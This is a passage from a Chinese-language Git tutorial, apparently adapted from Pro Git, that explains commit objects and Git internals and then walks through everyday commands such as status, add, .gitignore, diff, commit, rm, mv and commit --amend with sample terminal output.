object）能为你保存的基本信息。\n\n可以通过调用`commit-tree`命令创建一个提交对象，为此需要指定一个树对象的`SHA-1`值，以及该提交的父提交对象（如果有的话）。 我们从之前创建的第一个树对象开始：\n```shell\n$ echo 'first commit' | git commit-tree d8329f\nfdf4fc3344e67ab068f836878b6c4951e3b15f3d\n```\n由于创建时间和作者数据不同，你现在会得到一个不同的散列值。 请将本章后续内容中的提交和标签的散列值替换为你自己的校验和。 现在可以通过`git cat-file`命令查看这个新提交对象：\n```shell\n$ git cat-file -p fdf4fc3\ntree d8329fc1cc938780ffdd9f94e0d364e0ea74f579\nauthor Scott Chacon <schacon@gmail.com> 1243040974 -0700\ncommitter Scott Chacon <schacon@gmail.com> 1243040974 -0700\n\nfirst commit\n```\n提交对象的格式很简单：它先指定一个顶层树对象，代表当前项目快照； 然后是可能存在的父提交（前面描述的提交对象并不存在任何父提交）； 之后是作者/提交者信息（依据你的`user.name`和`user.email`配置来设定，外加一个时间戳）； 留空一行，最后是提交注释。\n\n接着，我们将创建另两个提交对象，它们分别引用各自的上一个提交（作为其父提交对象）：\n```shell\n$ echo 'second commit' | git commit-tree 0155eb -p fdf4fc3\ncac0cab538b970a37ea1e769cbbde608743bc96d\n$ echo 'third commit'  | git commit-tree 3c4e9c -p cac0cab\n1a410efbd13591db07496601ebc7a059dd55cfe9\n```\n这三个提交对象分别指向之前创建的三个树对象快照中的一个。 现在，如果对最后一个提交的`SHA-1`值运行`git log`命令，会出乎意料的发现，你已有一个货真价实的、可由`git log`查看的Git提交历史了：\n```shell\n$ git log --stat 1a410e\ncommit 1a410efbd13591db07496601ebc7a059dd55cfe9\nAuthor: Scott Chacon <schacon@gmail.com>\nDate:   Fri May 22 18:15:24 2009 -0700\n\n\tthird commit\n\n bak/test.txt | 1 +\n 1 file changed, 1 insertion(+)\n\ncommit cac0cab538b970a37ea1e769cbbde608743bc96d\nAuthor: Scott Chacon <schacon@gmail.com>\nDate:   Fri May 22 18:14:29 2009 -0700\n\n\tsecond commit\n\n new.txt  | 1 +\n test.txt | 2 +-\n 2 files changed, 2 insertions(+), 1 deletion(-)\n\ncommit fdf4fc3344e67ab068f836878b6c4951e3b15f3d\nAuthor: Scott Chacon <schacon@gmail.com>\nDate:   Fri May 22 18:09:34 2009 -0700\n\n    first commit\n\n test.txt | 1 +\n 1 file changed, 1 insertion(+)\n```\n太神奇了： 就在刚才，你没有借助任何上层命令，仅凭几个底层操作便完成了一个 Git 提交历史的创建。 这就是每次我们运行 git add 和 git commit 命令时，Git 所做的工作实质就是将被改写的文件保存为数据对象， 更新暂存区，记录树对象，最后创建一个指明了顶层树对象和父提交的提交对象。 这三种主要的 Git 对象——数据对象、树对象、提交对象——最初均以单独文件的形式保存在 .git/objects 目录下。 下面列出了目前示例目录内的所有对象，辅以各自所保存内容的注释：\n```shell\n$ find .git/objects -type f\n.git/objects/01/55eb4229851634a0f03eb265b69f5a2d56f341 # tree 2\n.git/objects/1a/410efbd13591db07496601ebc7a059dd55cfe9 # commit 3\n.git/objects/1f/7a7a472abf3dd9643fd615f6da379c4acb3e3a # test.txt v2\n.git/objects/3c/4e9cd789d88d8d89c1073707c3585e41b0e614 # tree 3\n.git/objects/83/baae61804e65cc73a7201a7252750c76066a30 # test.txt v1\n.git/objects/ca/c0cab538b970a37ea1e769cbbde608743bc96d # commit 2\n.git/objects/d6/70460b4b4aece5915caf5c68d12f560a9fe3e4 # 'test content'\n.git/objects/d8/329fc1cc938780ffdd9f94e0d364e0ea74f579 # tree 1\n.git/objects/fa/49b077972391ad58037050f2a75f74e3671e92 # new.txt\n.git/objects/fd/f4fc3344e67ab068f836878b6c4951e3b15f3d # commit 1\n```\n如果跟踪所有的内部指针，将得到一个类似下面的对象关系图：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105037.png)\n\n\n### Blob对象与树对象与提交对象的区别\nblob对象与树对象与提交对象都会以文件的形式存放在.git/object目录下\n- blob对象：保存文件内容\n- tree对象：保存目录结构、文件权限、文件名、其他tree对象、blob对象的引用\n- commit对象：保存上一个commit、对应快照、作者、提交信息、其他tree对象blob对象的引用\n其关系图如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105047.png)\n\n\n#### 为什么要把文件的权限和文件名储存在tree object里面而不是blob object呢？\n想象一下修改一个文件的命名。如果将文件名保存在blob里面，那么Git只能多复制一份原始内容形成一个新的blob object。而Git的实现方法只需要创建一个新的tree object将对应的文件名更改成新的即可，原本的blob object可以复用，节约了空间。\n\n### Git怎么保证历史记录不可篡改？\n通过SHA1哈希算法和哈希树来保证。假设你偷偷修改了历史变更记录上一个文件的内容，那么这个问卷的blob object的SHA1哈希值就变了，与之相关的tree object的SHA1也需要改变，commit的SHA1也要变，这个commit之后的所有commit SHA1值也要跟着改变。又由于Git是分布式系统，即所有人都有一份完整历史的Git仓库，所以所有人都能很轻松的发现存在问题。\n\n## 查看暂存区\nGit暂存区index文件位于.git目录下，当使用编辑器打开此文件的时候，发现里面全是乱码, Git提供了查看此文件内容的命令:`git ls-files`\n\n#### git ls-files\n参数说明（括号里是简写）\n- `--cached(-c)`显示暂存区中的文件，git ls-files命令默认的参数\n- `--deleted(-d)`显示删除的文件\n- `--modified(-m)`显示修改过的文件\n- `--other(-o)`显示没有被git跟踪的文件\n- `--stage(-s)`显示mode以及文件对应的Blob对象，进而我们可以获取暂存区中对应文件里面的内容。\n\n实例\n1.如何查看暂存区中有哪些文件？\n```shell\n$ git ls-files\nREADME\nRakefile\nlib/simplegit.rb\n```\n\n2. 如何查看暂存区中文件内容对应的Blob对象？\n```shell\n$ git ls-files -s\n100644 a906cb2a4a904a152e80877d4088654daad0c859 0\tREADME\n100644 8f94139338f9404f26296befa88755fc2598c289 0\tRakefile\n100644 47c6340d6459e05787f644c2447d2595f5d3a54b 0\tlib/simplegit.rb\n```\n\n# Git高层命令\n## 获取Git仓库\n通常有两种获取 Git 项目仓库的方式：\n- 将尚未进行版本控制的本地目录转换为 Git 仓库；\n- 从其它服务器 克隆 一个已存在的 Git 仓库。\n\n两种方式都会在你的本地机器上得到一个工作就绪的 Git 仓库。\n\n### 在已存在目录中初始化仓库\n如果你有一个尚未进行版本控制的项目目录，想要用 Git 来控制它，那么首先需要进入该项目目录中\n```shell\n$ git init\n```\n该命令将创建一个名为 .git 的子目录，这个子目录含有你初始化的 Git 仓库中所有的必须文件，这些文件是 Git 仓库的骨干。 但是，在这个时候，我们仅仅是做了一个初始化的操作，你的项目里的文件还没有被跟踪。 \n\n如果在一个已存在文件的文件夹（而非空文件夹）中进行版本控制，你应该开始追踪这些文件并进行初始提交。 可以通过`git add`命令来指定所需的文件来进行追踪，然后执行`git commit`：\n```shell\n$ git add *.c\n$ git add LICENSE\n$ git commit -m 'initial project version'\n```\n稍后我们再逐一解释这些指令的行为。 现在，你已经得到了一个存在被追踪文件与初始提交的 Git 仓库。\n\n### 克隆现有的仓库\n如果你想获得一份已经存在了的 Git 仓库的拷贝，比如说，你想为某个开源项目贡献自己的一份力，这时就要用到`git clone`命令。 如果你对其它的 VCS 系统（比如说 Subversion）很熟悉，请留心一下你所使用的命令是\"clone\"而不是\"checkout\"。 这是 Git 区别于其它版本控制系统的一个重要特性，Git 克隆的是该 Git 仓库服务器上的几乎所有数据，而不是仅仅复制完成你的工作所需要文件。 当你执行`git clone`命令的时候，默认配置下远程 Git 仓库中的每一个文件的每一个版本都将被拉取下来。 事实上，如果你的服务器的磁盘坏掉了，你通常可以使用任何一个克隆下来的用户端来重建服务器上的仓库 （虽然可能会丢失某些服务器端的钩子（hook）设置，但是所有版本的数据仍在，详见 在服务器上搭建 Git ）。\n\n克隆仓库的命令是`git clone <url>`。 比如，要克隆 Git 的链接库`libgit2`，可以用下面的命令：\n```shell\n$ git clone https://github.com/libgit2/libgit2\n```\n这会在当前目录下创建一个名为`“libgit2”`的目录，并在这个目录下初始化一个`.git`文件夹， 从远程仓库拉取下所有数据放入`.git`文件夹，然后从中读取最新版本的文件的拷贝。 如果你进入到这个新建的`libgit2`文件夹，你会发现所有的项目文件已经在里面了，准备就绪等待后续的开发和使用。\n\n如果你想在克隆远程仓库的时候，自定义本地仓库的名字，你可以通过额外的参数指定新的目录名：\n```shell\n$ git clone https://github.com/libgit2/libgit2 mylibgit\n```\n这会执行与上一条命令相同的操作，但目标目录名变为了`mylibgit`。\n\nGit 支持多种数据传输协议。 上面的例子使用的是`https://`协议，不过你也可以使用`git://`协议或者使用`SSH`传输协议，比如`user@server:path/to/repo.git`。 在服务器上搭建 Git 将会介绍所有这些协议在服务器端如何配置使用，以及各种方式之间的利弊。\n\n\n## 记录每次更新到仓库\n现在我们的机器上有了一个 真实项目 的 Git 仓库，并从这个仓库中检出了所有文件的 工作副本。 通常，你会对这些文件做些修改，每当完成了一个阶段的目标，想要将记录下它时，就将它提交到到仓库。\n\n请记住，你工作目录下的每一个文件都不外乎这两种状态：**已跟踪** 或 **未跟踪**。 已跟踪的文件是指那些被纳入了版本控制的文件，在上一次快照中有它们的记录，在工作一段时间后， 它们的状态可能是未修改，已修改或已放入暂存区。简而言之，已跟踪的文件就是 Git 已经知道的文件。\n\n工作目录中除已跟踪文件外的其它所有文件都属于未跟踪文件，它们既不存在于上次快照的记录中，也没有被放入暂存区。 初次克隆某个仓库的时候，工作目录中的所有文件都属于已跟踪文件，并处于未修改状态，因为 Git 刚刚检出了它们， 而你尚未编辑过它们。\n\n编辑过某些文件之后，由于自上次提交后你对它们做了修改，Git 将它们标记为已修改文件。 在工作时，你可以选择性地将这些修改过的文件放入暂存区，然后提交所有已暂存的修改，如此反复。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220409105058.png)\n\n### 检查当前文件状态\n可以用`git status`命令查看哪些文件处于什么状态。 如果在克隆仓库后立即使用此命令，会看到类似这样的输出：\n```shell\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nnothing to commit, working directory clean\n```\n这说明你现在的工作目录相当干净。换句话说，所有已跟踪文件在上次提交后都未被更改过。 此外，上面的信息还表明，当前目录下没有出现任何处于未跟踪状态的新文件，否则 Git 会在这里列出来。 最后，该命令还显示了当前所在分支，并告诉你这个分支同远程服务器上对应的分支没有偏离。 现在，分支名是“master”,这是默认的分支名。 我们在 Git 分支 中会详细讨论分支和引用。\n\n现在，让我们在项目下创建一个新的 README 文件。 如果之前并不存在这个文件，使用`git status`命令，你将看到一个新的未跟踪文件：\n```shell\n$ echo 'My Project' > README\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nUntracked files:\n  (use \"git add <file>...\" to include in what will be committed)\n\n    README\n\nnothing added to commit but untracked files present (use \"git add\" to track)\n```\n在状态报告中可以看到新建的 README 文件出现在`Untracked files`下面。 未跟踪的文件意味着 Git 在之前的快照（提交）中没有这些文件；Git 不会自动将之纳入跟踪范围，除非你明明白白地告诉它“我需要跟踪该文件”。 这样的处理让你不必担心将生成的二进制文件或其它不想被跟踪的文件包含进来。 不过现在的例子中，我们确实想要跟踪管理 README 这个文件。\n\n### 跟踪新文件\n使用命令`git add`开始跟踪一个文件。 所以，要跟踪README文件，运行：\n```shell\n$ git add README\n```\n此时再运行`git status`命令，会看到README文件已被跟踪，并处于暂存状态：\n```shell\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git restore --staged <file>...\" to unstage)\n\n    new file:   README\n```\n只要在`Changes to be committed`这行下面的，就说明是已暂存状态。 如果此时提交，那么该文件在你运行`git add`时的版本将被留存在后续的历史记录中。 你可能会想起之前我们使用`git init`后就运行了`git add <files>`命令，开始跟踪当前目录下的文件。`git add`命令使用文件或目录的路径作为参数；如果参数是目录的路径，该命令将递归地跟踪该目录下的所有文件。\n\n### 暂存已修改的文件\n现在我们来修改一个已被跟踪的文件。 如果你修改了一个名为`CONTRIBUTING.md`的已被跟踪的文件，然后运行`git status`命令，会看到下面内容：\n```shell\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    new file:   README\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n文件`CONTRIBUTING.md`出现在`Changes not staged for commit`这行下面，说明已跟踪文件的内容发生了变化，但还没有放到暂存区。 要暂存这次更新，需要运行`git add`命令。 这是个多功能命令：可以用它开始跟踪新文件，或者把已跟踪的文件放到暂存区，还能用于合并时把有冲突的文件标记为已解决状态等。 将这个命令理解为“精确地将内容添加到下一次提交中”而不是“将一个文件添加到项目中”要更加合适。 现在让我们运行 `git add`将“CONTRIBUTING.md”放到暂存区，然后再看看`git status`的输出：\n```shell\n$ git add CONTRIBUTING.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    new file:   README\n    modified:   CONTRIBUTING.md\n```\n现在两个文件都已暂存，下次提交时就会一并记录到仓库。 假设此时，你想要在 CONTRIBUTING.md 里再加条注释。 重新编辑存盘后，准备好提交。 不过且慢，再运行`git status`看看：\n```shell\n$ vim CONTRIBUTING.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    new file:   README\n    modified:   CONTRIBUTING.md\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n怎么回事？ 现在`CONTRIBUTING.md`文件同时出现在暂存区和非暂存区。 这怎么可能呢？ 好吧，实际上 Git 只不过暂存了你运行`git add`命令时的版本。 如果你现在提交，CONTRIBUTING.md 的版本是你最后一次运行`git add`命令时的那个版本，而不是你运行`git commit`时，在工作目录中的当前版本。 所以，运行了 `git add`之后又作了修订的文件，需要重新运行`git add`把最新版本重新暂存起来：\n```shell\n$ git add CONTRIBUTING.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    new file:   README\n    modified:   CONTRIBUTING.md\n```\n\n### 状态简览\n`git status`命令的输出十分详细，但其用语有些繁琐。 Git 有一个选项可以帮你缩短状态命令的输出，这样可以以简洁的方式查看更改。 如果你使用`git status -s`命令或`git status --short`命令，你将得到一种格式更为紧凑的输出。\n```shell\n$ git status -s\n M README\nMM Rakefile\nA  lib/git.rb\nM  lib/simplegit.rb\n?? LICENSE.txt\n```\n新添加的未跟踪文件前面有`??`标记，新添加到暂存区中的文件前面有`A`标记，修改过的文件前面有`M`标记。 输出中有两栏，左栏指明了暂存区的状态，右栏指明了工作区的状态。例如，上面的状态报告显示： README 文件在工作区已修改但尚未暂存，而`lib/simplegit.rb`文件已修改且已暂存。`Rakefile`文件已修，暂存后又作了修改，因此该文件的修改中既有已暂存的部分，又有未暂存的部分。\n\n### 忽略文件\n一般我们总会有些文件无需纳入 Git 的管理，也不希望它们总出现在未跟踪文件列表。 通常都是些自动生成的文件，比如日志文件，或者编译过程中创建的临时文件等。 在这种情况下，我们可以创建一个名为`.gitignore`的文件，列出要忽略的文件的模式。 来看一个实际的`.gitignore`例子：\n```shell\n$ cat .gitignore\n*.[oa]\n*~\n```\n第一行告诉 Git 忽略所有以`.o`或`.a`结尾的文件。一般这类对象文件和存档文件都是编译过程中出现的。 第二行告诉 Git 忽略所有名字以波浪符（~）结尾的文件，许多文本编辑软件（比如 Emacs）都用这样的文件名保存副本。 此外，你可能还需要忽略 log，tmp 或者 pid 目录，以及自动生成的文档等等。 要养成一开始就为你的新仓库设置好`.gitignore`文件的习惯，以免将来误提交这类无用的文件。\n\n文件 .gitignore 的格式规范如下：\n- 所有空行或者以`#`开头的行都会被 Git 忽略。\n- 可以使用标准的`glob`模式匹配，它会递归地应用在整个工作区中。\n- 匹配模式可以以（/）开头防止递归。\n- 匹配模式可以以（/）结尾指定目录。\n- 要忽略指定模式以外的文件或目录，可以在模式前加上叹号（!）取反。\n\n所谓的`glob`模式是指`shell`所使用的简化了的正则表达式。 星号（*）匹配零个或多个任意字符；`[abc]`匹配任何一个列在方括号中的字符 （这个例子要么匹配一个 a，要么匹配一个 b，要么匹配一个 c）； 问号（?）只匹配一个任意字符；如果在方括号中使用短划线分隔两个字符， 表示所有在这两个字符范围内的都可以匹配（比如`[0-9]`表示匹配所有 0 到 9 的数字）。 使用两个星号`（**）`表示匹配任意中间目录，比如`a/**/z`可以匹配 a/z 、 a/b/z 或 a/b/c/z 等。\n\n我们再看一个`.gitignore`文件的例子：\n```text\n# 忽略所有的 .a 文件\n*.a\n\n# 但跟踪所有的 lib.a，即便你在前面忽略了 .a 文件\n!lib.a\n\n# 只忽略当前目录下的 TODO 文件，而不忽略 subdir/TODO\n/TODO\n\n# 忽略任何目录下名为 build 的文件夹\nbuild/\n\n# 忽略 doc/notes.txt，但不忽略 doc/server/arch.txt\ndoc/*.txt\n\n# 忽略 doc/ 目录及其所有子目录下的 .pdf 文件\ndoc/**/*.pdf\n```\n>Tip\nGitHub 有一个十分详细的针对数十种项目及语言的`.gitignore`文件列表， 你可以在 https://github.com/github/gitignore 找到它。\n\n>Note\n在最简单的情况下，一个仓库可能只根目录下有一个`.gitignore`文件，它递归地应用到整个仓库中。 然而，子目录下也可以有额外的`.gitignore`文件。子目录中的`.gitignore`文件中的规则只作用于它所在的目录中。 （Linux 内核的源码库拥有 206 个`.gitignore`文件。）\n\n多个`.gitignore`文件的具体细节超出了本书的范围，更多详情见 man gitignore 。\n\n### 查看已暂存和未暂存的修改\n如果`git status`命令的输出对于你来说过于简略，而你想知道具体修改了什么地方，可以用`git diff`命令。 稍后我们会详细介绍`git diff`，你通常可能会用它来回答这两个问题：当前做的哪些更新尚未暂存？ 有哪些更新已暂存并准备好下次提交？ 虽然`git status`已经通过在相应栏下列出文件名的方式回答了这个问题，但`git diff`能通过文件补丁的格式更加具体地显示哪些行发生了改变。\n\n假如再次修改 README 文件后暂存，然后编辑 CONTRIBUTING.md 文件后先不暂存， 运行`status`命令将会看到：\n```shell\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    modified:   README\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n要查看尚未暂存的文件更新了哪些部分，不加参数直接输入`git diff`：\n```shell\n$ git diff\ndiff --git a/CONTRIBUTING.md b/CONTRIBUTING.md\nindex 8ebb991..643e24f 100644\n--- a/CONTRIBUTING.md\n+++ b/CONTRIBUTING.md\n@@ -65,7 +65,8 @@ branch directly, things can get messy.\n Please include a nice description of your changes when you submit your PR;\n if we have to read the whole diff to figure out why you're contributing\n in the first place, you're less likely to get feedback and have your change\n-merged in.\n+merged in. Also, split your changes into comprehensive chunks if your patch is\n+longer than a dozen lines.\n\n If you are starting to work on a particular area, feel free to submit a PR\n that highlights your work in progress (and note in the PR title that it's\n```\n此命令比较的是工作目录中当前文件和暂存区域快照之间的差异。 也就是修改之后还没有暂存起来的变化内容。\n\n若要查看已暂存的将要添加到下次提交里的内容，可以用`git diff --staged`命令。 这条命令将比对已暂存文件与最后一次提交的文件差异：\n```shell\n$ git diff --staged\ndiff --git a/README b/README\nnew file mode 100644\nindex 0000000..03902a1\n--- /dev/null\n+++ b/README\n@@ -0,0 +1 @@\n+My Project\n```\n请注意，`git diff`本身只显示尚未暂存的改动，而不是自上次提交以来所做的所有改动。 所以有时候你一下子暂存了所有更新过的文件，运行`git diff`后却什么也没有，就是这个原因。\n\n像之前说的，暂存 CONTRIBUTING.md 后再编辑，可以使用`git status`查看已被暂存的修改或未被暂存的修改。 如果我们的环境（终端输出）看起来如下：\n```shell\n$ git add CONTRIBUTING.md\n$ echo '# test line' >> CONTRIBUTING.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    modified:   CONTRIBUTING.md\n\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n```\n现在运行`git diff`看暂存前后的变化：\n```shell\n$ git diff\ndiff --git a/CONTRIBUTING.md b/CONTRIBUTING.md\nindex 643e24f..87f08c8 100644\n--- a/CONTRIBUTING.md\n+++ b/CONTRIBUTING.md\n@@ -119,3 +119,4 @@ at the\n ## Starter Projects\n\n See our [projects list](https://github.com/libgit2/libgit2/blob/development/PROJECTS.md).\n+# test line\n```\n然后用`git diff --cached`查看已经暂存起来的变化（ --staged 和 --cached 是同义词）：\n```shell\n$ git diff --cached\ndiff --git a/CONTRIBUTING.md b/CONTRIBUTING.md\nindex 8ebb991..643e24f 100644\n--- a/CONTRIBUTING.md\n+++ b/CONTRIBUTING.md\n@@ -65,7 +65,8 @@ branch directly, things can get messy.\n Please include a nice description of your changes when you submit your PR;\n if we have to read the whole diff to figure out why you're contributing\n in the first place, you're less likely to get feedback and have your change\n-merged in.\n+merged in. Also, split your changes into comprehensive chunks if your patch is\n+longer than a dozen lines.\n\n If you are starting to work on a particular area, feel free to submit a PR\n that highlights your work in progress (and note in the PR title that it's\n```\n\n>Note\nGit Diff 的插件版本\n在本书中，我们使用`git diff`来分析文件差异。 但是你也可以使用图形化的工具或外部`diff`工具来比较差异。 可以使用`git difftool`命令来调用`emerge`或`vimdiff`等软件（包括商业软件）输出`diff`的分析结果。 使用`git difftool --tool-help`命令来看你的系统支持哪些`Git Diff`插件。\n\n### 提交更新\n现在的暂存区已经准备就绪，可以提交了。 在此之前，请务必确认还有什么已修改或新建的文件还没有`git add`过， 否则提交的时候不会记录这些尚未暂存的变化。 这些已修改但未暂存的文件只会保留在本地磁盘。 所以，每次准备提交前，先用`git status`看下，你所需要的文件是不是都已暂存起来了， 然后再运行提交命令 `git commit`：\n```shell\n$ git commit\n```\n这样会启动你选择的文本编辑器来输入提交说明。\n当使用`git commit`进行提交操作时，Git 会先计算每一个子目录（本例中只有项目根目录）的校验和， 然后在 Git 仓库中这些校验和保存为树对象。随后，Git 便会创建一个提交对象，\n\n>Note\n启动的编辑器是通过 Shell 的环境变量 EDITOR 指定的，一般为 vim 或 emacs。 当然也可以按照 起步 介绍的方式， 使用`git config --global core.editor`命令设置你喜欢的编辑器。\n\n编辑器会显示类似下面的文本信息（本例选用 Vim 的屏显方式展示）：\n```text\n# Please enter the commit message for your changes. Lines starting\n# with '#' will be ignored, and an empty message aborts the commit.\n# On branch master\n# Your branch is up-to-date with 'origin/master'.\n#\n# Changes to be committed:\n#\tnew file:   README\n#\tmodified:   CONTRIBUTING.md\n#\n~\n~\n~\n\".git/COMMIT_EDITMSG\" 9L, 283C\n```\n可以看到，默认的提交消息包含最后一次运行`git status`的输出，放在注释行里，另外开头还有一个空行，供你输入提交说明。 你完全可以去掉这些注释行，不过留着也没关系，多少能帮你回想起这次更新的内容有哪些。\n\n>Note\n更详细的内容修改提示可以用 -v 选项查看，这会将你所作的更改的 diff 输出呈现在编辑器中，以便让你知道本次提交具体作出哪些修改。\n\n退出编辑器时，<font color=\"red\">Git 会丢弃注释行，用你输入的提交说明生成一次提交。</font>\n\n另外，你也可以在`commit`命令后添加`-m`选项，将提交信息与命令放在同一行，如下所示：\n```shell\n$ git commit -m \"Story 182: Fix benchmarks for speed\"\n[master 463dc4f] Story 182: Fix benchmarks for speed\n 2 files changed, 2 insertions(+)\n create mode 100644 README\n```\n好，现在你已经创建了第一个提交！ 可以看到，提交后它会告诉你，当前是在哪个分支（master）提交的，本次提交的完整 SHA-1 校验和是什么（463dc4f），以及在本次提交中，有多少文件修订过，多少行添加和删改过。\n\n请记住，提交时记录的是放在暂存区域的快照。 任何还未暂存文件的仍然保持已修改状态，可以在下次提交时纳入版本管理。 每一次运行提交操作，都是对你项目作一次快照，以后可以回到这个状态，或者进行比较。\n\n### 跳过使用暂存区域\n尽管使用暂存区域的方式可以精心准备要提交的细节，但有时候这么做略显繁琐。 Git 提供了一个跳过使用暂存区域的方式， 只要在提交的时候，给`git commit`加上`-a`选项，Git 就会自动把所有已经跟踪过的文件暂存起来一并提交，从而跳过`git add`步骤：\n```shell\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges not staged for commit:\n  (use \"git add <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n    modified:   CONTRIBUTING.md\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n$ git commit -a -m 'added new benchmarks'\n[master 83e38c7] added new benchmarks\n 1 file changed, 5 insertions(+), 0 deletions(-)\n```\n看到了吗？提交之前不再需要`git add`文件“CONTRIBUTING.md”了。 这是因为`-a`选项使本次提交包含了所有修改过的文件。 这很方便，但是要小心，有时这个选项会将不需要的文件添加到提交中。\n\n### 移除文件\n`git rm`命令用于删除文件。\n\n如果只是简单地从工作目录中手工删除文件，运行`git status`时就会在`Changes not staged for commit `的提示。\n```bash\n$ rm PROJECTS.md\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges not staged for commit:\n  (use \"git add/rm <file>...\" to update what will be committed)\n  (use \"git checkout -- <file>...\" to discard changes in working directory)\n\n        deleted:    PROJECTS.md\n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n```\n\n`git rm`删除文件有以下几种形式：\n\n1. 将文件从暂存区和工作区中删除：\n```bash\ngit rm <file>\n```\n以下实例从暂存区和工作区中删除`runoob.txt`文件：\n```bash\ngit rm runoob.txt \n```\n如果删除之前修改过并且已经放到暂存区域的话，则必须要用强制删除选项`-f`。\n\n强行从暂存区和工作区中删除修改后的 `runoob.txt` 文件：\n```bash\ngit rm -f runoob.txt \n```\n如果想把文件从暂存区域移除，但仍然希望保留在当前工作目录中，换句话说，仅是从跟踪清单中删除，使用--cached`选项即可：\n```bash\ngit rm --cached <file>\n```\n以下实例从暂存区中删除`runoob.txt`文件：\n```bash\ngit rm --cached runoob.txt\n```\n\n#### 实例\n删除`hello.php`文件：\n```bash\n$ git rm hello.php \nrm 'hello.php'\n$ ls\nREADME\n```\n\n文件从暂存区域移除，但工作区保留：\n```bash\n$ git rm --cached README \nrm 'README'\n$ ls\nREADME\n```\n\n可以递归删除，即如果后面跟的是一个目录做为参数，则会递归删除整个目录中的所有子目录和文件：\n```bash\ngit rm –r * \n```\n进入某个目录中，执行此语句，会删除该目录下的所有文件和子目录。\n\n### 移动文件\n不像其它的 VCS 系统，Git 并不显式跟踪文件移动操作。 如果在 Git 中重命名了某个文件，仓库中存储的元数据并不会体现出这是一次改名操作。 不过 Git 非常聪明，它会推断出究竟发生了什么，至于具体是如何做到的，我们稍后再谈。\n\n既然如此，当你看到 Git 的`mv`命令时一定会困惑不已。 要在 Git 中对文件改名，可以这么做：\n```shell\n$ git mv file_from file_to\n```\n它会恰如预期般正常工作。 实际上，即便此时查看状态信息，也会明白无误地看到关于重命名操作的说明：\n```shell\n$ git mv README.md README\n$ git status\nOn branch master\nYour branch is up-to-date with 'origin/master'.\nChanges to be committed:\n  (use \"git reset HEAD <file>...\" to unstage)\n\n    renamed:    README.md -> README\n```\n其实，运行`git mv`就相当于运行了下面三条命令：\n```shell\n$ mv README.md README\n$ git rm README.md\n$ git add README\n```\n如此分开操作，Git 也会意识到这是一次重命名，所以不管何种方式结果都一样。 两者唯一的区别是，`mv`是一条命令而非三条命令，直接用`git mv`方便得多。 不过有时候用其他工具批处理重命名的话，要记得在提交前删除旧的文件名，再添加新的文件名。\n\n## 撤消操作\n### 重写历史\n许多时候，在使用 Git 时，你可能想要修订提交历史。 Git 很棒的一点是它允许你在最后时刻做决定。 你可以在将暂存区内容提交前决定哪些文件进入提交，可以通过 git stash 来决定不与某些内容工作， 也可以重写已经发生的提交就像它们以另一种方式发生的一样。 这可能涉及改变提交的顺序，改变提交中的信息或修改文件，将提交压缩或是拆分， 或完全地移除提交——在将你的工作成果与他人共享之前。\n\n在本节中，你可以学到如何完成这些工作，这样在与他人分享你的工作成果时你的提交历史将如你所愿地展示出来。\n> Note\n在满意之前不要推送你的工作\nGit 的基本原则之一是，由于克隆中有很多工作是本地的，因此你可以 在本地 随便重写历史记录。 然而一旦推送了你的工作，那就完全是另一回事了，除非你有充分的理由进行更改，否则应该将推送的工作视为最终结果。 简而言之，在对它感到满意并准备与他人分享之前，应当避免推送你的工作。\n\n#### 修改最后一次提交\n修改你最近一次提交可能是所有修改历史提交的操作中最常见的一个。 对于你的最近一次提交，你往往想做两件事情：简单地修改提交信息， 或者通过添加、移除或修改文件来更改提交实际的内容。\n如果，你只是想修改最近一次提交的提交信息，那么很简单：\n```\n$ git commit --amend\n```\n上面这条命令会将最后一次的提交信息载入到编辑器中供你修改。 当保存并关闭编辑器后，编辑器会将更新后的提交信息写入新提交中，它会成为新的最后一次提交。\n另一方面，如果你想要修改最后一次提交的实际内容，那么流程很相似：首先作出你想要补上的修改， 暂存它们，然后用 git commit --amend 以新的改进后的提交来 替换 掉旧有的最后一次提交，\n使用这个技巧的时候需要小心，因为修正会改变提交的 SHA-1 校验和。 它类似于一个小的变基——如果已经推送了最后一次提交就不要修正它。\n\n> Tip\n修补后的提交可能需要修补提交信息\n当你在修补一次提交时，可以同时修改提交信息和提交内容。 如果你修补了提交的内容，那么几乎肯定要更新提交消息以反映修改后的内容。\n另一方面，如果你的修补是琐碎的（如修改了一个笔误或添加了一个忘记暂存的文件）， 